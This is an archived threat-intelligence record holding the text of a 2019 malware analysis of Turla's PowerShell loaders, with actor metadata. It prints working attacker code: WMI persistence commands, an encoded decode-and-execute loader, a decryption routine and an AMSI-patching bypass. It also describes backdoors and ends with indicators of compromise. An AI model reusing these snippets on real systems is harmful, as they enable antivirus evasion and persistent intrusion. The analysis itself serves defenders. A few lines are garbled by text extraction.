{
    "id": "b3abcd39-2ba8-44ad-93d2-1a0e3504a339",
    "created_at": "2023-01-12T15:04:50.506563Z",
    "updated_at": "2025-03-27T02:16:20.701198Z",
    "deleted_at": null,
    "sha1_hash": "05b6b611eaa9c4be6a42b5d1b3433181ffbc9b44",
    "title": "2019-05-29 - A dive into Turla PowerShell usage",
    "authors": "",
    "file_creation_date": "2022-05-28T00:36:57Z",
    "file_modification_date": "2022-05-28T00:36:57Z",
    "file_size": 740163,
    "plain_text": "# A dive into Turla PowerShell usage\n\n**welivesecurity.com/2019/05/29/turla-powershell-usage/**\n\nESET researchers analyze new TTPs attributed to the Turla group that leverage PowerShell to run malware in-memory only\n\n\nMay 29, 2019\n\n\nTurla, also known as Snake, is an infamous espionage group recognized for its complex malware. To confound detection, its operators\nrecently started using PowerShell scripts that provide direct, in-memory loading and execution of malware executables and libraries. This\nallows them to bypass detection that can trigger when a malicious executable is dropped on disk.\n\n[Turla is believed to have been operating since at least 2008, when it successfully breached the US military. More recently, it was involved in](https://www.nytimes.com/2010/08/26/technology/26cyber.html?_r=1&ref=technolog)\n[major attacks against the German Foreign Office and the](https://uk.reuters.com/article/us-germany-cyber/german-government-hack-was-part-of-worldwide-campaign-sources-idUKKCN1GE2H5) [French military.](https://www.lemonde.fr/international/article/2019/01/18/armees-la-france-prepare-ses-cyberoffensives_5410983_3210.html)\n\nThis is not the first time Turla has used PowerShell in-memory loaders to increase its chances of bypassing security products. In 2018,\n[Kaspersky Labs published a report that analyzed a Turla PowerShell loader that was based on the open-source project Posh-SecMod.](https://securelist.com/shedding-skin-turlas-fresh-faces/88069/)\nHowever, it was quite buggy and often led to crashes.\n\nAfter a few months, Turla has improved these scripts and is now using them to load a wide range of custom malware from its traditional\narsenal.\n\nThe victims are quite usual for Turla. We identified several diplomatic entities in Eastern Europe that were compromised using these scripts.\nHowever, it is likely the same scripts are used more globally against many traditional Turla targets in Western Europe and the Middle East.\nThus, this blogpost aims to help defenders counter these PowerShell scripts. We will also present various payloads, including an RPC-based\nbackdoor and a backdoor leveraging OneDrive as its Command and Control (C&C) server.\n\n## PowerShell Loader\n\nThe PowerShell loader has three main steps: persistence, decryption and loading into memory of the embedded executable or library.\n\n\n-----\n\n## Persistence\n\nThe PowerShell scripts are not simple droppers; they persist on the system as they regularly load into memory only the embedded\nexecutables. We have seen Turla operators use two persistence methods:\n\nA Windows Management Instrumentation (WMI) event subscription\nAlteration of the PowerShell profile (profile.ps1 file).\n\n### Windows Management Instrumentation\n\nIn the first case, attackers create two WMI event filters and two WMI event consumers. The consumers are simply command lines launching\nbase64-encoded PowerShell commands that load a large PowerShell script stored in the Windows registry. Figure 1 shows how the\npersistence is established.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n\nGet-WmiObject CommandLineEventConsumer -Namespace root\\subscription -filter \"name='Syslog Consumer'\" | Remove-WmiObject;\n\n$NLP35gh = Set-WmiInstance -Namespace \"root\\subscription\" -Class 'CommandLineEventConsumer' -Arguments @{name='Syslog\nConsumer';CommandLineTemplate=\"$($Env:SystemRoot)\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -enc\n$HL39fjh\";RunInteractively='false'};\n\nGet-WmiObject __eventFilter -namespace root\\subscription -filter \"name='Log Adapter Filter'\"| Remove-WmiObject;\n\nGet-WmiObject __FilterToConsumerBinding -Namespace root\\subscription | Where-Object {$_.filter -match 'Log Adapter'} | RemoveWmiObject;\n\n$IT825cd = \"SELECT * FROM __instanceModificationEvent WHERE TargetInstance ISA 'Win32_LocalTime' AND\nTargetInstance.Hour=15 AND TargetInstance.Minute=30 AND TargetInstance.Second=40\";\n\n$VQI79dcf = Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments @{name='Log Adapter\nFilter';EventNameSpace='root\\CimV2';QueryLanguage='WQL';Query=$IT825cd};\n\nSet-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments\n@{Filter=$VQI79dcf;Consumer=$NLP35gh};\n\nGet-WmiObject __eventFilter -namespace root\\subscription -filter \"name='AD Bridge Filter'\"| Remove-WmiObject;\n\nGet-WmiObject __FilterToConsumerBinding -Namespace root\\subscription | Where-Object {$_.filter -match 'AD Bridge'} | RemoveWmiObject;\n\n$IT825cd = \"SELECT * FROM __instanceModificationEvent WITHIN 60 WHERE TargetInstance ISA\n'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300 AND TargetInstance.SystemUpTime < 400\";\n\n$VQI79dcf = Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments @{name='AD Bridge\nFilter';EventNameSpace='root\\CimV2';QueryLanguage='WQL';Query=$IT825cd};\n\nSet-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments\n@{Filter=$VQI79dcf;Consumer=$NLP35gh};\n\n\n_Figure 1. Persistence using WMI_\n\nThese events will run respectively at 15:30:40 and when the system uptime is between 300 and 400 seconds. The variable $HL39fjh contains\nthe base64-encoded PowerShell command shown in Figure 2. It reads the Windows Registry key where the encrypted payload is stored, and\ncontains the password and the salt needed to decrypt the payload.\n\n1 [System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(\"<base64-encoded password and salt\">)) | iex ;\n\n[Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((Get-ItemProperty '$ZM172da').'$WY79ad')) | iex\n\n_Figure 2. WMI consumer PowerShell command_\n\nFinally, the script stores the encrypted payload in the Windows registry. Note that the attackers seem to use a different registry location per\norganization. Thus, it is not a useful indicator to detect similar intrusions.\n\n### Profile.ps1\n\n[In the latter case, attackers alter the PowerShell profile. According to the Microsoft documentation:](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-6)\n\n_A PowerShell profile is a script that runs when PowerShell starts. You can use the profile as a logon script to customize the environment. You_\n_can add commands, aliases, functions, variables, snap-ins, modules, and PowerShell drives._\n\n\n-----\n\ngu e 3 s o s a o e S e p o e od ed by u a\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n\ntry\n\n{\n\n$SystemProc = (Get-WmiObject 'Win32_Process' | ?{$_.ProcessId -eq $PID} | % {Invoke-WmiMethod -InputObject $_ -Name 'GetOwne\n\nif (\"$SystemProc\" -ne \"\")\n\n{\n\n$([Convert]::ToBase64String($([Text.Encoding]::ASCII.GetBytes(\"<m>$([DateTime]::Now.ToString('G')): STARTED </m>\") | %{ $_ -bxor\n\n[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\"IABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZ\n| iex | Out-Null;\n\nkill $PID;\n\n}\n\n}\n\ncatch{$([Convert]::ToBase64String($([Text.Encoding]::ASCII.GetBytes(\"<m>$([DateTime]::Now.ToString('G')): $_ </m>\") | %{ $_ -bxor 0xAA\n\n\n_Figure 3. Hijacked profile.ps1 file_\n\nThe base64-encoded PowerShell command is very similar to the one used in the WMI consumers.\n\n## Decryption\n\nThe payload stored in the Windows registry is another PowerShell script. It is generated using the open-source script Out[EncryptedScript.ps1 from the Penetration testing framework PowerSploit. In addition, the variable names are randomized to obfuscate the](https://github.com/PowerShellMafia/PowerSploit)\nscript, as shown in Figure 4.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n\n$GSP540cd = \"<base64 encoded + encrypted payload>\";\n\n$RS99ggf = $XZ228hha.GetBytes(\"PINGQXOMQFTZGDZX\");\n\n$STD33abh = [Convert]::FromBase64String($GSP540cd);\n\n$SB49gje = New-Object System.Security.Cryptography.PasswordDeriveBytes($IY51aab, $XZ228hha.GetBytes($CBI61aeb), \"SHA1\",\n2);\n\n[Byte[]]$XYW18ja = $SB49gje.GetBytes(16);\n\n$EN594ca = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider;\n\n$EN594ca.Mode = [System.Security.Cryptography.CipherMode]::CBC;\n\n[Byte[]]$ID796ea = New-Object Byte[]($STD33abh.Length);\n\n$ZQD772bf = $EN594ca.CreateDecryptor($XYW18ja, $RS99ggf);\n\n$DCR12ffg = New-Object System.IO.MemoryStream($STD33abh, $True);\n\n$WG731ff = New-Object System.Security.Cryptography.CryptoStream($DCR12ffg, $ZQD772bf,\n\n[System.Security.Cryptography.CryptoStreamMode]::Read);\n\n$XBD387bb = $WG731ff.Read($ID796ea, 0, $ID796ea.Length);\n\n$OQ09hd = [YR300hf]::IWM01jdg($ID796ea);\n\n$DCR12ffg.Close();\n\n$WG731ff.Close();\n\n$EN594ca.Clear();\n\nreturn $XZ228hha.GetString($OQ09hd,0,$OQ09hd.Length);\n\n\n_Figure 4. Decryption routine_\n\n[The payload is decrypted using the 3DES algorithm. The Initialization Vector, PINGQXOMQFTZGDZX in this example, is different for each](https://en.wikipedia.org/wiki/Triple_DES)\nsample. The key and the salt are also different for each script and are not stored in the script, but only in the WMI filter or in the profile.ps1\nfil\n\n\n-----\n\n## PE loader\n\nThe payload decrypted at the previous step is a PowerShell reflective loader. It is based on the script [Invoke-ReflectivePEInjection.ps1 from](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1)\nthe same PowerSploit framework. The executable is hardcoded in the script and is loaded directly into the memory of a randomly chosen\nprocess that is already running on the system.\n\nIn some samples, the attackers specify a list of executables that the binary should not be injected into, as shown in Figure 5.\n\n1 $IgnoreNames =\n@(\"smss.exe\",\"csrss.exe\",\"wininit.exe\",\"winlogon.exe\",\"lsass.exe\",\"lsm.exe\",\"svchost.exe\",\"avp.exe\",\"avpsus.exe\",\"klnagent.exe\",\"vapm.exe\n\n_Figure 5. Example list of excluded processes_\n\nIt is interesting to note that the names avp.exe, avpsus.exe, klnagent.exe and vapm.exe refer to Kaspersky Labs executables. It seems that\nTurla operators really want to avoid injecting their malware into Kaspersky software.\n\n### AMSI bypass\n\nIn some samples deployed since March 2019, Turla developers modified their PowerShell scripts in order to bypass the Antimalware Scan\nInterface (AMSI). This is an interface allowing any Windows application to integrate with the installed antimalware product. It is particularly\nuseful for PowerShell and macros.\n\n[They did not find a new bypass but re-used a technique presented at Black Hat Asia 2018 in the talk The Rise and Fall of AMSI. It consists of](https://i.blackhat.com/briefings/asia/2018/asia-18-Tal-Liberman-Documenting-the-Undocumented-The-Rise-and-Fall-of-AMSI.pdf)\nthe in-memory patching of the beginning of the function AmsiScanBuffer in the library amsi.dll.\n\nThe PowerShell script loads a .NET executable to retrieve the address of AmsiScanBuffer. Then, it calls VirtualProtect to allow writing at the\nretrieved address.\n\nFinally, the patching is done directly in the PowerShell script as shown in Figure 6. It modifies the beginning of AmsiScanBuffer to always\nreturn 1 (AMSI_RESULT_NOT_DETECTED). Thus, the antimalware product will not receive the buffer, which prevents any scanning.\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n\n$ptr = [Win32]::FindAmsiFun();\n\nif($ptr -eq 0)\n\n{\n\nWrite-Host \"protection not found\"\n\n}\n\nelse\n\n{\n\nif([IntPtr]::size -eq 4)\n\n{\n\nWrite-Host \"x32 protection detected\"\n\n$buf = New-Object Byte[] 7\n\n$buf[0] = 0x66; $buf[1] = 0xb8; $buf[2] = 0x01; $buf[3] = 0x00; $buf[4] = 0xc2; $buf[5] = 0x18; $buf[6] = 0x00; #mov ax, 1 ;ret 0x18;\n\n$c = [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 7)\n\n}\n\nelse\n\n{\n\nWrite-Host \"x64 protection detected\"\n\n$buf = New-Object Byte[] 6\n\n$buf[0] = 0xb8; $buf[1] = 0x01; $buf[2] = 0x00; $buf[3] = 0x00; $buf[4] = 0x00; $buf[5] = 0xc3; #mov eax, 1 ;ret;\n\n$c = [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 6)\n\n}\n\n}\n\n\n_Figure 6. Patching of AmsiScanBuffer function_\n\n## Payloads\n\nThe PowerShell scripts we have presented are generic components used to load various payloads, such as an RPC Backdoor and a\nPowerShell backdoor.\n\n## RPC backdoor\n\nTurla has developed a whole set of backdoors relying on the RPC protocol. These backdoors are used to perform lateral movement and take\ncontrol of other machines in the local network without relying on an external C&C server.\n\nThe features implemented are quite basic: file upload, file download and command execution via cmd.exe or PowerShell. However, the\nmalware also supports the addition of plugins.\n\nThis RPC backdoor is split into two components: a server and a client. An operator will use the client component to execute commands on\nanother machine where the server component exists, as summarized in Figure 7.\n\n\n-----\n\n_Figure 7. RPC backdoor usage_\n\nFor instance, the sample identified by the following SHA-1 hash EC54EF8D79BF30B63C5249AF7A8A3C652595B923 is a client version.\nThis component opens the named pipe \\\\pipe\\\\atctl with the protocol sequence being “ncacn_np” via the RpcStringBindingComposeW\nfunction. The sample can then send commands by calling the NdrClientCall2 function. The exported procedure HandlerW, responsible for\nparsing the arguments, shows that it is also possible to try to impersonate an anonymous token or try to steal another’s process token just for\nthe execution of a command.\n\nIts server counterpart does the heavy lifting and implements the different commands. It first checks if the registry key value\nHKLM\\SYSTEM\\CurrentControlSet\\services\\LanmanServer\\Parameters\\NullSessionPipes contains “atctl”. If so, the server sets the security\ndescriptor on the pipe object to “S:(ML;;NW;;;S-1-16-0)” via the SetSecurityInfo function. This will make the pipe available to everyone\n(untrusted/anonymous integrity level).\n\n[The following image shows the corresponding MIDL stub descriptor and the similar syntax and interface ID.](https://docs.microsoft.com/en-us/windows/desktop/rpc/using-midl)\n\n_Figure 8. RPC backdoor client’s MIDL on the left, server’s on the right_\n\nAs mentioned previously, this backdoor also supports loading plugins. The server creates a thread that searches for files matching the\nfollowing pattern lPH*.dll. If such a file exists, it is loaded and its export function ModuleStart is called. Among the various plugins we have\nlocated so far, one is able to steal recent files and files from USB thumb drives.\n\nMany variants of this RPC backdoor are used in the wild. Among some of them, we have seen local proxies (using upnprpc as the endpoint\n[and ncalrpc as the protocol sequence) and newer versions embedding PowerShellRunner to run scripts directly without using powershell.exe.](https://github.com/EmpireProject/PSInject/blob/master/PowerShellRunner/PowerShellRunner.cs)\n\n## RPC Spoof Server\n\n\n-----\n\nu g ou esea c, e a so d sco e ed a po tab e e ecutab e t t e e bedded pdb\npath C:\\Users\\Devel\\source\\repos\\RPCSpoofer\\x64\\Release_Win2016_10\\RPCSpoofServerInstall.pdb (SHA-1:\n9D1C563E5228B2572F5CA14F0EC33CA0DEDA3D57).\n\nThe main purpose of this utility is to retrieve the RPC configuration of a process that has registered an interface. In order to find that kind of\nprocess, it iterates through the TCP table (via the GetTcpTable2 function) until it either finds the PID of the process that has opened a specific\nport, or retrieves the PID of the process that has opened a specific named pipe. Once this PID is found, this utility reads the remote process’\n[memory and tries to retrieve the registered RPC interface. The code for this, seen in Figure 9, seems ripped from this Github repository.](https://github.com/silverf0x/RpcView)\n\n_Figure 9. Snippet of code searching for the .data section of rpcrt4.dll in a remote process (Hex-Rays screenshot)_\n\nAt first we were unsure how the retrieved information was used but then another sample, (SHA-1:\nB948E25D061039D64115CFDE74D2FF4372E83765) helped us understand. As shown in Figure 10, this sample retrieves the RPC interface,\nunsets the flag to RPC_IF_ALLOW_SECURE_ONLY, and patches the “dispatch table” in memory using the WriteProcessMemory function.\nThose operations would allow the sample to add its RPC functions to an already existing RPC interface. We believe it is stealthier to re-use\nan existing RPC interface than to create a custom one.\n\n\n-----\n\n_Figure 10. Snippet of code retrieving the RPC dispatch table of the current process (Hex-Rays screenshot)_\n\n## PowerStallion\n\nPowerStallion is a lightweight PowerShell backdoor using Microsoft OneDrive, a storage service in the cloud, as C&C server. The credentials\nare hardcoded at the beginning of the script, as shown in Figure 11.\n\n_Figure 11. OneDrive credentials in PowerStallion script_\n\n[It is interesting to note that Turla operators used the free email provider GMX again, as in the Outlook Backdoor and in LightNeuron. They](https://www.welivesecurity.com/wp-content/uploads/2018/08/Eset-Turla-Outlook-Backdoor.pdf)\nalso used the name of a real employee of the targeted organization in the email address.\n\nThen it uses a net use command to connect to the network drive. It then checks, in a loop, as shown in Figure 12, if a command is available.\nThis backdoor can only execute additional PowerShell scripts. It writes the command results in another OneDrive subfolder and encrypts it\nwith the XOR key 0xAA.\n\n\n-----\n\n_Figure 12. Main loop of the PowerStallion backdoor_\n\nAnother interesting artefact is that the script modifies the modification, access and creation (MAC) times of the local log file to match the times\nof a legitimate file – desktop.ini in that example, as shown in Figure 13.\n\n_Figure 13. Modification of MAC times of the local log file_\n\n[We believe this backdoor is a recovery access tool in case the main Turla backdoors, such as Carbon or](https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/) [Gazer, are cleaned and operators](https://www.welivesecurity.com/wp-content/uploads/2017/08/eset-gazer.pdf)\ncan no longer access the compromised computers. We have seen operators use this backdoor for the following purposes:\n\nMonitoring antimalware logs.\nMonitoring the Windows process list.\nInstalling ComRAT version 4, one of the Turla second-stage backdoors.\n\n## Conclusion\n\nIn a [2018 blogpost, we predicted that Turla would use more and more generic tools. This new research confirms our forecast and shows that](https://www.welivesecurity.com/2018/05/22/turla-mosquito-shift-towards-generic-tools/)\nthe Turla group does not hesitate to use open-source pen-testing frameworks to conduct intrusion.\n\nHowever, it does not prevent attributing such attacks to Turla. Attackers tend to configure or modify those open-source tools to better suit their\nneeds Thus it is still possible to separate different clusters of activities\n\n\n-----\n\na y, t e usage o ope sou ce too s does ot ea u a as stopped us g ts custo too s e pay oads de e ed by t e o e S e\n[scripts, the RPC backdoor and PowerStallion, are actually very customized. Our recent analysis of Turla LightNeuron is additional proof that](https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf)\nthis group is still developing complex, custom malware.\n\nWe will continue monitoring new Turla activities and will publish relevant information on our blog. For any inquiries, contact us as\n_[threatintel@eset.com. Indicators of Compromise can also be found on our GitHub.](http://10.10.0.46/mailto:threatintel@eset.com)_\n\n## Indicators of Compromise (IoCs)\n\n Hashes\n\n**SHA-1 hash** **Description** **ESET detection name**\n\n50C0BF9479EFC93FA9CF1AA99BDCA923273B71A1 PowerShell loader with encrypted payload PowerShell/Turla.T\n\nEC54EF8D79BF30B63C5249AF7A8A3C652595B923 RPC backdoor (client) Win64/Turla.BQ\n\n9CDF6D5878FC3AECF10761FD72371A2877F270D0 RPC backdoor (server) Win64/Turla.BQ\n\nD3DF3F32716042404798E3E9D691ACED2F78BDD5 File exfiltration RPC plugin Win32/Turla.BZ\n\n9D1C563E5228B2572F5CA14F0EC33CA0DEDA3D57 RPCSpoofServerInstaller Win64/Turla.BS\n\nB948E25D061039D64115CFDE74D2FF4372E83765 RPC interface patcher Win64/Turla.BR\n\n## Filenames\n\nRPC components\n\n%PUBLIC%\\iCore.dat (log file, one-byte XOR 0x55)\n\\\\pipe\\\\atctl (named pipe)\nPowerStallion\n\nmsctx.ps1\nC:\\Users\\Public\\Documents\\desktop.db\n\n## Registry keys\n\nRPC components\n\nHKLM\\SYSTEM\\CurrentControlSet\\services\\LanmanServer\\Parameters\\NullSessionPipes contains atctl\n\n## MITRE ATT&CK techniques\n\n**Tactic** **ID** **Name** **Description**\n\nExecution [T1086](https://attack.mitre.org/techniques/T1086/) PowerShell The loaders are written in PowerShell.\nSome RPC components can execute\nPowerShell commands.\n\n\nPersistence [T1084](https://attack.mitre.org/techniques/T1084/) Windows Management Instrumentation Event\nSubscription\n\n\nThe PowerShell loaders use WMI for\npersistence.\n\n\nDefense\nEvasion\n\n\n[T1027](https://attack.mitre.org/techniques/T1027/) Obfuscated Files or Information The RPC backdoor and PowerStallion\nencrypt the log file.\n\n\n[T1140](https://attack.mitre.org/techniques/T1140/) Deobfuscate/Decode\nFiles or Information\n\n\nThe PowerShell loaders decrypt the embedded\npayload.\n\n\n[T1055](https://attack.mitre.org/techniques/T1055/) Process Injection The PowerShell loaders inject the payload into a\nremote process.\n\n[T1099](https://attack.mitre.org/techniques/T1099/) Timestomp PowerStallion modifies the timestamps of its log\nfile.\n\nDiscovery [T1083](https://attack.mitre.org/techniques/T1083/) File and Directory Discovery The RPC plugin gathers file and directory\ninformation.\n\n\n[T1120](https://attack.mitre.org/techniques/T1120/) Peripheral Device\nDiscovery\n\n\nThe RPC plugin monitors USB drives.\n\n\n[T1012](https://attack.mitre.org/techniques/T1012/) Query Registry The server component of the RPC backdoor\nqueries the registry for NullSessionPipes.\n\n\n-----\n\n**Tactic** **ID** **Name** **Description**\n\n[T1057](https://attack.mitre.org/techniques/T1057/) Process Discovery PowerStallion sent the list of running processes.\n\nCollection [T1005](https://attack.mitre.org/techniques/T1005/) Data from Local System The RPC plugin collects recent files from\nthe local file system.\n\n\n[T1025](https://attack.mitre.org/techniques/T1025/) Data from Removable\nMedia\n\n\nThe RPC plugin collects files from USB drives.\n\n\nCommand\nand Control\n\n\n[T1071](https://attack.mitre.org/techniques/T1071/) Standard Application Layer Protocol The RPC backdoor uses RPC and\nPowerStallion uses OneDrive via SMB.\n\n\nExfiltration [T1041](https://attack.mitre.org/techniques/T1041/) Exfiltration Over Command and Control Channel PowerStallion exfiltrates information\nthrough the C&C channel.\n\n29 May 2019 - 11:30AM\n\n### Sign up to receive an email update whenever a new article is published in our Ukraine Crisis – Digital Security Resource Center\n\n Newsletter\n\n Discussion\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-05-29 - A dive into Turla PowerShell usage.pdf"
    ],
    "report_names": [
        "2019-05-29 - A dive into Turla PowerShell usage.pdf"
    ],
    "threat_actors": [
        {
            "id": "a97cf06d-c2e2-4771-99a2-c9dee0d6a0ac",
            "created_at": "2022-10-25T16:07:24.349252Z",
            "updated_at": "2025-03-27T02:02:10.184406Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "ATK 13",
                "Belugasturgeon",
                "Blue Python",
                "CTG-8875",
                "Group 88",
                "ITG12",
                "Iron Hunter",
                "Krypton",
                "Makersmark",
                "Operation Epic Turla",
                "Operation Moonlight Maze",
                "Operation Penguin Turla",
                "Operation Satellite Turla",
                "Operation Skipper Turla",
                "Operation Turla Mosquito",
                "Operation WITCHCOVEN",
                "Pacifier APT",
                "Pensive Ursa",
                "Popeye",
                "SIG15",
                "SIG2",
                "SIG23",
                "Secret Blizzard",
                "TAG-0530",
                "Turla",
                "UNC4210",
                "Venomous Bear",
                "Waterbug"
            ],
            "source_name": "ETDA:Turla",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "ATI-Agent",
                "AdobeARM",
                "Agent.BTZ",
                "Agent.DNE",
                "BigBoss",
                "COMpfun",
                "Chinch",
                "Cloud Duke",
                "CloudDuke",
                "CloudLook",
                "Cobra Carbon System",
                "ComRAT",
                "DoublePulsar",
                "EmPyre",
                "EmpireProject",
                "Epic Turla",
                "EternalBlue",
                "EternalRomance",
                "GoldenSky",
                "Group Policy Results Tool",
                "HTML5 Encoding",
                "HyperStack",
                "IcedCoffee",
                "IronNetInjector",
                "KSL0T",
                "Kapushka",
                "Kazuar",
                "KopiLuwak",
                "Kotel",
                "LOLBAS",
                "LOLBins",
                "LightNeuron",
                "Living off the Land",
                "Maintools.js",
                "Metasploit",
                "Meterpreter",
                "MiamiBeach",
                "Mimikatz",
                "MiniDionis",
                "Minit",
                "NBTscan",
                "NETTRANS",
                "NETVulture",
                "Neptun",
                "NetFlash",
                "NewPass",
                "Outlook Backdoor",
                "Penquin Turla",
                "Pfinet",
                "PowerShell Empire",
                "PowerShellRunner",
                "PowerShellRunner-based RPC backdoor",
                "PowerStallion",
                "PsExec",
                "PyFlash",
                "QUIETCANARY",
                "Reductor RAT",
                "RocketMan",
                "SMBTouch",
                "SScan",
                "Satellite Turla",
                "SilentMoon",
                "Sun rootkit",
                "TTNG",
                "TadjMakhal",
                "Tavdig",
                "TinyTurla",
                "TinyTurla Next Generation",
                "TinyTurla-NG",
                "Topinambour",
                "Tunnus",
                "Turla",
                "Turla SilentMoon",
                "TurlaChopper",
                "Uroburos",
                "Urouros",
                "WCE",
                "WITCHCOVEN",
                "WhiteAtlas",
                "WhiteBear",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "Wipbot",
                "WorldCupSec",
                "XTRANS",
                "certutil",
                "certutil.exe",
                "gpresult",
                "nbtscan",
                "nbtstat",
                "pwdump"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8aaa5515-92dd-448d-bb20-3a253f4f8854",
            "created_at": "2024-06-19T02:03:08.147099Z",
            "updated_at": "2025-03-27T02:05:17.408118Z",
            "deleted_at": null,
            "main_name": "IRON HUNTER",
            "aliases": [
                "Belugasturgeon ",
                "Blue Python ",
                "CTG-8875 ",
                "ITG12 ",
                "KRYPTON ",
                "MAKERSMARK ",
                "Pensive Ursa ",
                "Secret Blizzard ",
                "Turla",
                "UAC-0003 ",
                "UAC-0024 ",
                "UNC4210 ",
                "Venomous Bear ",
                "Waterbug ",
                "ATK13 "
            ],
            "source_name": "Secureworks:IRON HUNTER",
            "tools": [
                " ComRAT",
                " Kazuar",
                " KopiLuwak",
                " LightNeuron",
                " Mosquito",
                " Nautilus",
                " Neuron",
                " Penquin",
                " PoisonFrog",
                " PyFlash",
                " Skipper",
                " Snake",
                " Tavdig",
                " TinyTurla",
                " Tunnus",
                "Carbon-DLL"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a97fee0d-af4b-4661-ae17-858925438fc4",
            "created_at": "2023-01-06T13:46:38.396415Z",
            "updated_at": "2025-03-27T02:00:02.823045Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Uroburos",
                "Hippo Team",
                "Pacifier APT",
                "MAKERSMARK",
                "ATK13",
                "UAC-0003",
                "IRON HUNTER",
                "Waterbug",
                "TAG_0530",
                "KRYPTON",
                "Popeye",
                "SIG23",
                "UAC-0144",
                "G0010",
                "Blue Python",
                "VENOMOUS Bear",
                "Group 88",
                "Pfinet",
                "ITG12",
                "UNC4210",
                "Secret Blizzard",
                "UAC-0024"
            ],
            "source_name": "MISPGALAXY:Turla",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d11c89bb-1640-45fa-8322-6f4e4053d7f3",
            "created_at": "2022-10-25T15:50:23.509601Z",
            "updated_at": "2025-03-27T02:00:55.487991Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Turla",
                "IRON HUNTER",
                "Group 88",
                "Waterbug",
                "WhiteBear",
                "Krypton",
                "Venomous Bear",
                "Secret Blizzard",
                "BELUGASTURGEON"
            ],
            "source_name": "MITRE:Turla",
            "tools": [
                "PsExec",
                "nbtstat",
                "ComRAT",
                "netstat",
                "certutil",
                "KOPILUWAK",
                "IronNetInjector",
                "LunarWeb",
                "Arp",
                "Uroburos",
                "PowerStallion",
                "Kazuar",
                "Systeminfo",
                "LightNeuron",
                "Mimikatz",
                "Tasklist",
                "LunarMail",
                "HyperStack",
                "NBTscan",
                "TinyTurla",
                "Penquin",
                "LunarLoader"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535890,
    "ts_updated_at": 1743041780,
    "ts_creation_date": 1653698217,
    "ts_modification_date": 1653698217,
    "files": {
        "pdf": "https://archive.orkl.eu/05b6b611eaa9c4be6a42b5d1b3433181ffbc9b44.pdf",
        "text": "https://archive.orkl.eu/05b6b611eaa9c4be6a42b5d1b3433181ffbc9b44.txt",
        "img": "https://archive.orkl.eu/05b6b611eaa9c4be6a42b5d1b3433181ffbc9b44.jpg"
    }
}